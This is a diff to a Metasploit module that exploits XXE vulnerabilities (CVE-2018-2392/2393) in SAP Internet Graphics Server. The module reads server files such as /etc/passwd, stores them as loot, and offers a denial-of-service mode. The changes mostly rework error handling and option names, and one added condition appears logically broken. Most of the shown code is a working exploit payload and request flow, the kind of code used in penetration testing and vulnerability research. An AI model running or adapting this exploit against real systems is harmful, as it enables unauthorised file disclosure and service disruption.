@@ -5,7 +5,6 @@
 
 class MetasploitModule < Msf::Auxiliary
 
-  prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -15,10 +14,14 @@ class MetasploitModule < Msf::Auxiliary
           'Name' => 'SAP Internet Graphics Server (IGS) XMLCHART XXE',
           'Description' => %q{
             This module exploits CVE-2018-2392 and CVE-2018-2393, two XXE vulnerabilities within the XMLCHART page
-            of SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53. Successful
-            exploitation will allow unauthenticated remote attackers to read files from the server as the user from which
-            the IGS service is started, which will typically be the SAP admin user. Alternatively attackers may also
-            be able to abuse the XXE to conduct a denial of service attack against the vulnerable SAP IGS server.
+            of SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53. These
+            vulnerabilities occur due to a lack of appropriate validation on the Extension HTML tag when
+            submitting a POST request to the XMLCHART page to generate a new chart.
+
+            Successful exploitation will allow unauthenticated remote attackers to read files from the server as the user
+            from which the IGS service is started, which will typically be the SAP admin user. Alternatively attackers
+            can also abuse the XXE vulnerability to conduct a denial of service attack against the vulnerable
+            SAP IGS server.
           },
           'Author' => [
             'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
@@ -45,16 +48,16 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(40080),
         OptString.new('FILE', [ false, 'File to read from the remote server', '/etc/passwd']),
-        OptString.new('PATH', [ true, 'Path to the SAP IGS XMLCHART page from the web root', '/XMLCHART']),
+        OptString.new('URIPATH', [ true, 'Path to the SAP IGS XMLCHART page from the web root', '/XMLCHART']),
       ]
     )
   end
 
   def setup_xml_and_variables
-    @host = @datastore['RHOSTS']
-    @port = @datastore['RPORT']
-    @path = @datastore['PATH']
-    @file = @datastore['FILE']
+    @host = datastore['RHOSTS']
+    @port = datastore['RPORT']
+    @path = datastore['URIPATH']
+    @file = datastore['FILE']
     if datastore['SSL']
       @schema = 'https://'
     else
@@ -84,7 +87,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def make_xxe_xml(file_name)
-    setup_xml_and_variables
     entity = Rex::Text.rand_text_alpha(5)
     @xxe_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
     <!DOCTYPE Extension [<!ENTITY #{entity} SYSTEM "#{file_name}">]>
@@ -100,8 +102,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def make_post_data(file_name, dos = false)
-    setup_xml_and_variables
-
     if !dos
       make_xxe_xml(file_name)
     else
@@ -166,19 +166,21 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     rescue StandardError => e
-      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@path}")
+      print_error("Failed to retrieve SAP IGS page at #{@schema}#{@host}:#{@port}#{@path}")
       vprint_error("Error #{e.class}: #{e}")
+      return nil
     end
 
     # Check first HTTP response
-    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !first_response.body.match?(/ImageMap|Errors/)
-      return Exploit::CheckCode::Safe
+    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !first_response.body.match?(/ImageMap|Errors/).nil?
+      print_error('The SAP IGS server did not respond to the first HTTP request in the expected manner!')
+      return nil
     end
 
     first_response
   end
 
-  def analyze_first_response(html_response, file_name)
+  def analyze_first_response(html_response, _file_name)
     get_download_link(html_response)
     if !@download_link.to_s.empty?
 
@@ -194,16 +196,18 @@ class MetasploitModule < Msf::Auxiliary
       rescue StandardError => e
         print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@download_link}")
         vprint_error("Error #{e.class}: #{e}")
+        return -1 # Some exception was thrown whilst making the second HTTP request!
       end
 
       # Check second HTTP response
       if second_response.nil? || second_response.code != 200 || !second_response.body.include?('area shape=rect')
-        return Exploit::CheckCode::Safe
+        return -2 # Reponse from second HTTP request was not what was expected!
       end
 
       get_file_content(second_response.body)
+      return 0
     else
-      print_status("System is vulnerable, but the file #{file_name} was not found on the host #{@host}")
+      return -3 # Download link could not be found!
     end
   end
 
@@ -216,15 +220,28 @@ class MetasploitModule < Msf::Auxiliary
 
     # Get OS release information
     check_response = send_first_request
+    if check_response.nil?
+      return Exploit::CheckCode::Safe
+    end
+
     os_release = ''
-    analyze_first_response(check_response.body, '/etc/os-release')
-    if @file_content
+    result = analyze_first_response(check_response.body, '/etc/os-release')
+
+    # Handle all the odd cases where analyze_first_response may not return a success code, aka a return value of 0.
+    if result == -1 || result == -3
+      Exploit::CheckCode::Safe('The server did not respond to the second request in the expected manner and is therefore safe')
+    elsif result == -2
+      Exploit::CheckCode::Unknown('Some connection error occured and it was not possible to determine if the server is vulnerable or not')
+    end
+
+    if !@file_content.to_s.empty?
       if (os_regex = @file_content.match(/^PRETTY_NAME.*=.*"(?<os>.*)"$/))
         os_release = "OS info: #{os_regex[:os]}"
+      else
+        return Exploit::CheckCode::Safe("#{@host} did not return the contents of the requested file, aka /etc/os-release. This host is likely patched.")
       end
     end
 
-    # Report service
     if os_release != ''
       ident = "SAP Internet Graphics Server (IGS); #{os_release}"
     else
@@ -248,7 +265,7 @@ class MetasploitModule < Msf::Auxiliary
       info: os_release
     )
 
-    Exploit::CheckCode::Vulnerable("#{@host} returned a response indicating that its XMLCHART page is vulnerable to XXE! #{os_release}")
+    Exploit::CheckCode::Vulnerable("#{@host} running #{os_release} returned a response indicating that its XMLCHART page is vulnerable to XXE!")
 
   end
 
@@ -271,8 +288,23 @@ class MetasploitModule < Msf::Auxiliary
 
     # Download remote file
     first_response = send_first_request
-    analyze_first_response(first_response.body, @file)
-    if @file_content
+    if first_response.nil?
+      fail_with(Failure::UnexpectedReply, 'The server did not respond to the first request in an expected manner.')
+    end
+
+    result = analyze_first_response(first_response.body, @file)
+    # Handle all the odd cases where analyze_first_response may not return a success code, aka a return value of 0.
+    if result == -1
+      fail_with(Failure::UnexpectedReply, 'The server encountered an exception when trying to respond to the second request and did not respond in the expected manner.')
+    elsif result == -2
+      print_error('The server responded successfully but the response indicated the server is not vulnerable!')
+      return
+    elsif result == -3
+      print_error('The server responded successfully but no download link was found in the response, so it is not vulnerable!')
+      return
+    end
+
+    if !@file_content.to_s.empty?
       vprint_good("File: #{@file} content from host: #{@host}\n#{@file_content}")
       loot = store_loot('sap.igs.xmlchart.xxe', 'text/plain', @host, @file_content, @file, 'SAP IGS XMLCHART XXE')
       print_good("File: #{@file} saved in: #{loot}")
@@ -293,7 +325,7 @@ class MetasploitModule < Msf::Auxiliary
       )
 
     else
-      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@path}")
+      fail_with(Failure::NotVulnerable, 'Could not retrieve the content of the target file!')
     end
 
   end
@@ -332,14 +364,13 @@ class MetasploitModule < Msf::Auxiliary
         name: name,
         refs: references
       )
-
     rescue StandardError => e
-      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@path}")
+      print_error("Failed to retrieve SAP IGS page at #{@schema}#{@host}:#{@port}#{@path}")
       vprint_error("Error #{e.class}: #{e}")
     end
 
     # Check HTTP response
-    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@path}") unless dos_response.code != 200
+    fail_with(Failure::NotVulnerable, 'The target responded with a 200 OK response code. The DoS attempt was unsuccessful.') unless dos_response.code != 200
 
   end
 
